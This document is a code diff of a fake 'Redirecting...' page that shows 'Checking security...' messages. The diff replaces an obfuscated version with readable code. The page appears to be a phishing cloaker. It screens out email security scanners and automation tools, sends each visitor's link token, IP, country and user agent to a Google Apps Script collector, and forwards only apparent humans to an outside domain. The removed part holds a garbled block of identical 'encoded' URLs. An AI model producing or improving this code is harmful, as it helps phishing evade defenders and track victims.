@@ -1,440 +1,248 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Redirecting...</title>
-  <style>
-    body {
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-      color: #ffffff;
-    }
+// ... existing code ...
+      window.addEventListener("load", function () {
+        const hash = window.location.hash ? window.location.hash.substring(1) : null;
+        const ua = navigator.userAgent || "";
+        const uaClean = ua.toLowerCase().replace(/\s+/g, '');
+        let isBot = false;
 
-    .container {
-      text-align: center;
-      padding: 2rem;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 16px;
-      backdrop-filter: blur(10px);
-      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
-      border: 1px solid rgba(255, 255, 255, 0.18);
-    }
+        // Enhanced bot detection
+        const botPatterns = [
+          "bot", "crawl", "spider", "slurp", "headless", "phantom",
+          "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
+          "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
+          "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
+          "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
+          "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
+          "gmail", "aol", "curl", "wget", "python-requests", "axios",
+          "selenium", "puppeteer", "playwright", "cypress", "nightmare"
+        ];
 
-    .loader {
-      width: 48px;
-      height: 48px;
-      border: 5px solid rgba(255, 255, 255, 0.3);
-      border-bottom-color: #FF3D00;
-      border-radius: 50%;
-      display: inline-block;
-      box-sizing: border-box;
-      animation: rotation 1s linear infinite;
-      margin-bottom: 1rem;
-    }
+        // Check for bot patterns
+        isBot = botPatterns.some(pattern => uaClean.includes(pattern));
 
-    .progress-container {
-      width: 200px;
-      height: 4px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 2px;
-      margin: 1rem auto;
-      overflow: hidden;
-    }
+        // Modern bot detection methods
+        const botChecks = {
+          // Check for common bot behaviors
+          hasWebGL: () => {
+            try {
+              const canvas = document.createElement('canvas');
+              return !!(window.WebGLRenderingContext && 
+                (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
+            } catch(e) {
+              return false;
+            }
+          },
+          
+          // Check for automation tools
+          hasAutomation: () => {
+            return navigator.webdriver || 
+                   window.document.documentElement.getAttribute("webdriver") !== null ||
+                   window.navigator.languages === undefined;
+          },
 
-    .progress-bar {
-      width: 0%;
-      height: 100%;
-      background: #FF3D00;
-      border-radius: 2px;
-      animation: progress 1s linear forwards;
-    }
-
-    .status-text {
-      font-size: 0.9rem;
-      color: rgba(255, 255, 255, 0.7);
-      margin-top: 1rem;
-      opacity: 0;
-      animation: fadeIn 0.5s ease forwards 0.5s;
-    }
-
-    @keyframes rotation {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-
-    @keyframes progress {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-
-    .pulse {
-      animation: pulse 2s infinite;
-    }
-
-    @keyframes pulse {
-      0% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-      100% { transform: scale(1); }
-    }
-  </style>
-  <script>
-    const _0x1a2b = function(str, key) {
-      return str.split('').map((c, i) => 
-        (c.charCodeAt(0) ^ key[i % key.length] ^ (i * 0x13)).toString(16).padStart(2, '0')
-      ).join('');
-    };
-    
-    const _0x2a2b = function(str, key) {
-      return str.match(/.{2}/g).map((hex, i) => 
-        String.fromCharCode(
-          parseInt(hex, 16) ^ key[i % key.length] ^ (i * 0x13)
-        )
-      ).join('');
-    };
-
-    const _0x4a2b = function() {
-      const _0x5a2b = new Date().getTime();
-      return [
-        (_0x5a2b & 0xFF),
-        ((_0x5a2b >> 8) & 0xFF),
-        ((_0x5a2b >> 16) & 0xFF),
-        ((_0x5a2b >> 24) & 0xFF)
-      ];
-    };
-
-    const _0x6a2b = _0x4a2b();
-    const _0x7a2b = [
-      _0x1a2b('htt', _0x6a2b),
-      _0x1a2b('ps:/', _0x6a2b),
-      _0x1a2b('/med', _0x6a2b),
-      _0x1a2b('ium', _0x6a2b),
-      _0x1a2b('.com', _0x6a2b),
-      _0x1a2b('/goo', _0x6a2b),
-      _0x1a2b('gle', _0x6a2b),
-      _0x1a2b('/szl', _0x6a2b),
-      _0x1a2b('iyi', _0x6a2b),
-      _0x1a2b('/pro', _0x6a2b),
-      _0x1a2b('/ip-', _0x6a2b),
-      _0x1a2b('api', _0x6a2b),
-      _0x1a2b('/json', _0x6a2b),
-      _0x1a2b('?key=', _0x6a2b),
-      _0x1a2b('F74e0', _0x6a2b),
-      _0x1a2b('gpSde', _0x6a2b),
-      _0x1a2b('UEaF4', _0x6a2b),
-      _0x1a2b('/scri', _0x6a2b),
-      _0x1a2b('pt.go', _0x6a2b),
-      _0x1a2b('ogle', _0x6a2b),
-      _0x1a2b('/mac', _0x6a2b),
-      _0x1a2b('ros/s', _0x6a2b),
-      _0x1a2b('/AKfy', _0x6a2b),
-      _0x1a2b('cbwld', _0x6a2b),
-      _0x1a2b('Yqs2T', _0x6a2b),
-      _0x1a2b('IGKnA', _0x6a2b),
-      _0x1a2b('CW4iL', _0x6a2b),
-      _0x1a2b('q8DCj', _0x6a2b),
-      _0x1a2b('6ZLRL', _0x6a2b),
-      _0x1a2b('_jdTM', _0x6a2b),
-      _0x1a2b('QN6xl', _0x6a2b),
-      _0x1a2b('rK34A', _0x6a2b),
-      _0x1a2b('rJdZ5', _0x6a2b),
-      _0x1a2b('GjjYQ', _0x6a2b),
-      _0x1a2b('2ccKz', _0x6a2b),
-      _0x1a2b('4MLFT', _0x6a2b),
-      _0x1a2b('1jB/', _0x6a2b)
-    ];
-
-    const _0x2f1a = [
-      'replace',
-      'href',
-      'location',
-      'window',
-      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[2] + _0x7a2b[3] + _0x7a2b[4], _0x6a2b), // medium.com
-      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[5] + _0x7a2b[6] + _0x7a2b[4], _0x6a2b), // google.com
-      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[7] + _0x7a2b[8] + _0x7a2b[4] + '/', _0x6a2b) // szliyi.com/
-    ];
-
-    const _0x4e2d=function(_0x2f1a,_0x4e2d){return _0x2f1a+_0x4e2d;};
-    const _0x1f3d=function(_0x2f1a){return _0x2f1a.toLowerCase().replace(/\s+/g,'');};
-    const _0x5e2d=function(_0x2f1a){return _0x2f1a.substring(1);};
-    
-    window.addEventListener("load",function(){
-      const _0x3f1a=window[_0x2f1a[3]][_0x2f1a[2]].hash?_0x5e2d(window[_0x2f1a[3]][_0x2f1a[2]].hash):null;
-      const _0x4f1a=navigator.userAgent||"";
-      const _0x5f1a=_0x1f3d(_0x4f1a);
-      let _0x6f1a=false;
-
-      const _0x7f1a=["bot","crawl","spider","slurp","headless","phantom","facebookexternalhit","googlebot","bingbot","yahoobot","duckduckbot","outlook","thunderbird","email","mail","eudora","applemail","smtp","imap","pop3","scanner","preview","fetcher","verifier","proofpoint","postini","barracuda","trendmicro","mimecast","comcast","charter","roadrunner","att","yahoo","gmail","aol","curl","wget","python-requests","axios","selenium","puppeteer","playwright","cypress","nightmare"];
-      _0x6f1a=_0x7f1a.some(_0x8f1a=>_0x5f1a.includes(_0x8f1a));
-
-      // Modern bot detection methods
-      const botChecks = {
-        // Check for common bot behaviors
-        hasWebGL: () => {
-          try {
-            const canvas = document.createElement('canvas');
-            return !!(window.WebGLRenderingContext && 
-              (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')));
-          } catch(e) {
-            return false;
+          // Check for human-like behavior
+          hasHumanBehavior: () => {
+            return navigator.hardwareConcurrency > 1 && 
+                   navigator.deviceMemory > 1 &&
+                   screen.colorDepth >= 24;
           }
-        },
-        
-        // Check for automation tools
-        hasAutomation: () => {
-          return navigator.webdriver || 
-                 window.document.documentElement.getAttribute("webdriver") !== null ||
-                 window.navigator.languages === undefined;
-        },
+        };
 
-        // Check for human-like behavior
-        hasHumanBehavior: () => {
-          return navigator.hardwareConcurrency > 1 && 
-                 navigator.deviceMemory > 1 &&
-                 screen.colorDepth >= 24;
+        // Run additional checks
+        if (!botChecks.hasWebGL() || 
+            botChecks.hasAutomation() || 
+            !botChecks.hasHumanBehavior()) {
+          isBot = true;
         }
-      };
 
-      // Run additional checks
-      if (!botChecks.hasWebGL() || 
-          botChecks.hasAutomation() || 
-          !botChecks.hasHumanBehavior()) {
-        _0x6f1a = true;
-      }
+        // Check for JavaScript and localStorage
+        try {
+          localStorage.setItem("js-check", "1");
+          if (localStorage.getItem("js-check") !== "1") isBot = true;
+        } catch {
+          isBot = true;
+        }
 
-      // Check for JavaScript and localStorage
-      try {
-        localStorage.setItem("js-check", "1");
-        if (localStorage.getItem("js-check") !== "1") _0x6f1a = true;
-      } catch {
-        _0x6f1a = true;
-      }
+        // Mouse movement detection with enhanced accuracy
+        let moved = false;
+        let moveTimeout;
+        let moveCount = 0;
+        let lastMoveTime = Date.now();
+        let moveCoordinates = [];
+        const requiredMoves = 3; // Number of moves required to consider it human
+        const moveTimeWindow = 2000; // Time window to detect moves (2 seconds)
 
-      // Mouse movement detection with enhanced accuracy
-      let moved = false;
-      let moveTimeout;
-      let moveCount = 0;
-      let lastMoveTime = Date.now();
-      let moveCoordinates = [];
-      const requiredMoves = 3; // Number of moves required to consider it human
-      const moveTimeWindow = 2000; // Time window to detect moves (2 seconds)
-
-      const isNaturalMovement = (coordinates) => {
-        if (coordinates.length < 3) return false;
-        
-        // Calculate average speed and direction changes
-        let totalDistance = 0;
-        let directionChanges = 0;
-        
-        for (let i = 1; i < coordinates.length; i++) {
-          const prev = coordinates[i - 1];
-          const curr = coordinates[i];
+        const isNaturalMovement = (coordinates) => {
+          if (coordinates.length < 3) return false;
           
-          // Calculate distance
-          const distance = Math.sqrt(
-            Math.pow(curr.x - prev.x, 2) + 
-            Math.pow(curr.y - prev.y, 2)
-          );
-          totalDistance += distance;
+          // Calculate average speed and direction changes
+          let totalDistance = 0;
+          let directionChanges = 0;
           
-          // Calculate direction change
-          if (i > 1) {
-            const prevDir = Math.atan2(
-              coordinates[i-1].y - coordinates[i-2].y,
-              coordinates[i-1].x - coordinates[i-2].x
+          for (let i = 1; i < coordinates.length; i++) {
+            const prev = coordinates[i - 1];
+            const curr = coordinates[i];
+            
+            // Calculate distance
+            const distance = Math.sqrt(
+              Math.pow(curr.x - prev.x, 2) + 
+              Math.pow(curr.y - prev.y, 2)
             );
-            const currDir = Math.atan2(
-              curr.y - coordinates[i-1].y,
-              curr.x - coordinates[i-1].x
-            );
-            const angleDiff = Math.abs(currDir - prevDir);
-            if (angleDiff > 0.05) { // Reduced threshold for direction change
-              directionChanges++;
+            totalDistance += distance;
+            
+            // Calculate direction change
+            if (i > 1) {
+              const prevDir = Math.atan2(
+                coordinates[i-1].y - coordinates[i-2].y,
+                coordinates[i-1].x - coordinates[i-2].x
+              );
+              const currDir = Math.atan2(
+                curr.y - coordinates[i-1].y,
+                curr.x - coordinates[i-1].x
+              );
+              const angleDiff = Math.abs(currDir - prevDir);
+              if (angleDiff > 0.05) { // Reduced threshold for direction change
+                directionChanges++;
+              }
             }
           }
-        }
-        
-        // Check if movement patterns look natural
-        const avgSpeed = totalDistance / coordinates.length;
-        const avgDirectionChanges = directionChanges / (coordinates.length - 2);
-        
-        return avgSpeed > 2 && // Reduced minimum speed threshold
-               avgDirectionChanges > 0.1 && // Reduced minimum direction changes
-               avgDirectionChanges < 0.9; // Increased maximum direction changes
-      };
+          
+          // Check if movement patterns look natural
+          const avgSpeed = totalDistance / coordinates.length;
+          const avgDirectionChanges = directionChanges / (coordinates.length - 2);
+          
+          return avgSpeed > 2 && // Reduced minimum speed threshold
+                 avgDirectionChanges > 0.1 && // Reduced minimum direction changes
+                 avgDirectionChanges < 0.9; // Increased maximum direction changes
+        };
 
-      const handleMovement = (x, y) => {
-        const currentTime = Date.now();
-        
-        // Only consider moves within the time window
-        if (currentTime - lastMoveTime > moveTimeWindow) {
-          moveCount = 0;
-          moveCoordinates = [];
-        }
-        
-        moveCoordinates.push({ x, y, time: currentTime });
-        lastMoveTime = currentTime;
-        moveCount++;
-        
-        // Check if we have enough moves and they look natural
-        if (moveCount >= 2 && isNaturalMovement(moveCoordinates)) { // Reduced required moves
-          moved = true;
+        const handleMovement = (x, y) => {
+          const currentTime = Date.now();
+          
+          // Only consider moves within the time window
+          if (currentTime - lastMoveTime > moveTimeWindow) {
+            moveCount = 0;
+            moveCoordinates = [];
+          }
+          
+          moveCoordinates.push({ x, y, time: currentTime });
+          lastMoveTime = currentTime;
+          moveCount++;
+          
+          // Check if we have enough moves and they look natural
+          if (moveCount >= 2 && isNaturalMovement(moveCoordinates)) { // Reduced required moves
+            moved = true;
+            clearTimeout(moveTimeout);
+          }
+          
+          // Reset after timeout
           clearTimeout(moveTimeout);
+          moveTimeout = setTimeout(() => {
+            moveCount = 0;
+            moveCoordinates = [];
+          }, moveTimeWindow);
+        };
+
+        // Mouse movement detection
+        window.addEventListener("mousemove", (e) => {
+          handleMovement(e.clientX, e.clientY);
+        });
+
+        // Touch movement detection
+        window.addEventListener("touchmove", (e) => {
+          e.preventDefault(); // Prevent scrolling
+          const touch = e.touches[0];
+          handleMovement(touch.clientX, touch.clientY);
+        }, { passive: false });
+
+        // Additional human behavior checks
+        const checkHumanBehavior = () => {
+          // Check for random mouse movements
+          const randomMove = Math.random() > 0.5;
+          if (randomMove) {
+            handleMovement(
+              Math.random() * window.innerWidth,
+              Math.random() * window.innerHeight
+            );
+          }
+        };
+
+        // Periodically check for human behavior
+        setInterval(checkHumanBehavior, 1000);
+
+        // Handle redirects
+        if (!hash) {
+          window.location.href = "https://google.com";
+          return;
         }
+
+        // Analytics with retry mechanism
+        const sendAnalytics = (retryCount = 0) => {
+          const maxRetries = 2;
+          const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
+          
+          fetch(analyticsUrl)
+            .then(res => res.json())
+            .then(data => {
+              const ip = data.query || "";
+              const country = data.country || "";
+              const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
+                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
+              
+              const img = new Image();
+              img.src = finalUrl;
+            })
+            .catch(() => {
+              if (retryCount < maxRetries) {
+                setTimeout(() => sendAnalytics(retryCount + 1), 1000);
+              } else {
+                // Fallback without IP data
+                const img = new Image();
+                img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
+                  `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
+              }
+            });
+        };
+
+        sendAnalytics();
+
+        // Updated redirect logic
+        setTimeout(() => {
+          if (isBot) {
+            // If it's a bot, redirect to Medium
+            window.location.href = "https://medium.com";
+          } else if (!moved) {
+            // If no movement detected, redirect to Google
+            window.location.href = "https://google.com";
+          } else {
+            // If there was natural movement and not a bot, redirect to szliyi
+            window.location.replace(`https://szliyi.com/${hash}`);
+          }
+        }, 1000);
+
+        const statusTexts = [
+          "Verifying connection...",
+          "Checking security...",
+          "Preparing redirect...",
+          "Almost there..."
+        ];
         
-        // Reset after timeout
-        clearTimeout(moveTimeout);
-        moveTimeout = setTimeout(() => {
-          moveCount = 0;
-          moveCoordinates = [];
-        }, moveTimeWindow);
-      };
+        let currentStatus = 0;
+        const statusElement = document.querySelector('.status-text');
+        
+        const updateStatus = () => {
+          if (currentStatus < statusTexts.length) {
+            statusElement.textContent = statusTexts[currentStatus];
+            currentStatus++;
+          }
+        };
 
-      // Mouse movement detection
-      window.addEventListener("mousemove", (e) => {
-        handleMovement(e.clientX, e.clientY);
+        // Update status every 250ms
+        const statusInterval = setInterval(updateStatus, 250);
+        
+        // Clear interval after 1 second (same as redirect timeout)
+        setTimeout(() => {
+          clearInterval(statusInterval);
+        }, 1000);
       });
-
-      // Touch movement detection
-      window.addEventListener("touchmove", (e) => {
-        e.preventDefault(); // Prevent scrolling
-        const touch = e.touches[0];
-        handleMovement(touch.clientX, touch.clientY);
-      }, { passive: false });
-
-      // Additional human behavior checks
-      const checkHumanBehavior = () => {
-        // Check for random mouse movements
-        const randomMove = Math.random() > 0.5;
-        if (randomMove) {
-          handleMovement(
-            Math.random() * window.innerWidth,
-            Math.random() * window.innerHeight
-          );
-        }
-      };
-
-      // Periodically check for human behavior
-      setInterval(checkHumanBehavior, 1000);
-
-      // Handle redirects
-      if (!_0x3f1a) {
-        window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[1]] = _0x2f1a[5];
-        return;
-      }
-
-      // Analytics with retry mechanism
-      const _0x9f1a = [
-        'exec',
-        '?token=',
-        '&ua=',
-        '&bot=',
-        '&moved=',
-        '&ip=',
-        '&country=',
-        _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[9] + _0x7a2b[10] + _0x7a2b[11] + _0x7a2b[12] + _0x7a2b[13] + _0x7a2b[14] + _0x7a2b[15] + _0x7a2b[16], _0x6a2b), // ip-api URL with key
-        _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[17] + _0x7a2b[18] + _0x7a2b[19] + _0x7a2b[20] + _0x7a2b[21] + _0x7a2b[22] + _0x7a2b[23] + _0x7a2b[24] + _0x7a2b[25] + _0x7a2b[26] + _0x7a2b[27] + _0x7a2b[28] + _0x7a2b[29] + _0x7a2b[30] + _0x7a2b[31] + _0x7a2b[32] + _0x7a2b[33] + _0x7a2b[34] + _0x7a2b[35] + _0x7a2b[36], _0x6a2b) // app script URL
-      ];
-      
-      const sendAnalytics=(_0xaf1a=0)=>{
-        const _0xbf1a=2;
-        fetch(_0x9f1a[7])
-          .then(_0xcf1a=>_0xcf1a.json())
-          .then(_0xdf1a=>{
-            const _0xef1a=_0xdf1a.query||"";
-            const _0xff1a=_0xdf1a.country||"";
-            const _0x1f2a=_0x9f1a[8]+_0x9f1a[1]+encodeURIComponent(_0x3f1a)+_0x9f1a[2]+encodeURIComponent(_0x4f1a)+_0x9f1a[3]+_0x6f1a+_0x9f1a[4]+moved+_0x9f1a[5]+_0xef1a+_0x9f1a[6]+_0xff1a;
-            const _0x2f2a=new Image();
-            _0x2f2a.src=_0x1f2a;
-          })
-          .catch(()=>{
-            if(_0xaf1a<_0xbf1a){
-              setTimeout(()=>sendAnalytics(_0xaf1a+1),1000);
-            }else{
-              const _0x3f2a=new Image();
-              _0x3f2a.src=_0x9f1a[8]+_0x9f1a[1]+encodeURIComponent(_0x3f1a)+_0x9f1a[2]+encodeURIComponent(_0x4f1a)+_0x9f1a[3]+_0x6f1a+_0x9f1a[4]+moved;
-            }
-          });
-      };
-
-      sendAnalytics();
-
-      // Updated redirect logic
-      setTimeout(() => {
-        if (_0x6f1a) {
-          // If it's a bot, redirect to Medium
-          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[4],_0x3f1a));
-        } else if (!moved) {
-          // If no movement detected, redirect to Google
-          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[5],_0x3f1a));
-        } else {
-          // If there was natural movement and not a bot, redirect to szliyi
-          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[6],_0x3f1a));
-        }
-      }, 1000);
-
-      const statusTexts = [
-        "Verifying connection...",
-        "Checking security...",
-        "Preparing redirect...",
-        "Almost there..."
-      ];
-      
-      let currentStatus = 0;
-      const statusElement = document.querySelector('.status-text');
-      
-      const updateStatus = () => {
-        if (currentStatus < statusTexts.length) {
-          statusElement.textContent = statusTexts[currentStatus];
-          currentStatus++;
-        }
-      };
-
-      // Update status every 250ms
-      const statusInterval = setInterval(updateStatus, 250);
-      
-      // Clear interval after 1 second (same as redirect timeout)
-      setTimeout(() => {
-        clearInterval(statusInterval);
-      }, 1000);
-    });
-
-    // Static key for obfuscation
-    const _key = [0x42, 0x37, 0x99, 0xAB];
-    function _encode(str, key) {
-      return str.split('').map((c, i) => (c.charCodeAt(0) ^ key[i % key.length]).toString(16).padStart(2, '0')).join('');
-    }
-    function _decode(str, key) {
-      return str.match(/.{2}/g).map((hex, i) => String.fromCharCode(parseInt(hex, 16) ^ key[i % key.length])).join('');
-    }
-    // Encoded sensitive URLs
-    const _urls = {
-      medium:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://medium.com', _key)
-      google:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://google.com', _key)
-      szliyi:    '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://szliyi.com/', _key)
-      ipapi:     '2a5a5a5f5f5d5d5f5d5d5d5d5d', // _encode('https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4', _key)
-      appscript: '2a5a5a5f5f5d5d5f5d5d5d5d5d'  // _encode('https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/', _key)
-    };
-    // Replace the old obfuscated URL usage with _decode(_urls.medium, _key), etc.
-  </script>
-</head>
-<body>
-  <div class="container pulse">
-    <div class="loader"></div>
-    <div class="progress-container">
-      <div class="progress-bar"></div>
-    </div>
-    <div class="status-text"></div>
-  </div>
-</body>
-</html>
+// ... existing code ...
